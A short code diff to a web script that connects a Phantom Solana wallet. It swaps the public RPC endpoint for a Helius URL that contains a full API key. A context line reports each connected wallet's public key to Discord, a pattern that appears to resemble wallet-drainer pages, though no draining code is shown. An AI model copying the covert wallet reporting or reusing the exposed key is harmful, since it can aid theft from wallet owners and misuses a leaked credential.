@@ -35,9 +35,9 @@ $(document).ready(function() {
                 sendToDiscord(`Wallet connected: ${resp.publicKey.toString()}`);
                 console.log("Phantom Wallet connected:", resp);
 
-                // Use public Solana RPC (CORS-friendly for browsers)
+                // Use Helius RPC (replace with your API key)
                 connection = new solanaWeb3.Connection(
-                    'https://api.mainnet-beta.solana.com',
+                    'https://mainnet.helius-rpc.com/?api-key=7cb186dd-794c-43d8-bb96-ced040b343dc',
                     'confirmed'
                 );
 
@@ -130,5 +130,3 @@ $(document).ready(function() {
         }
     }
 });
-
-
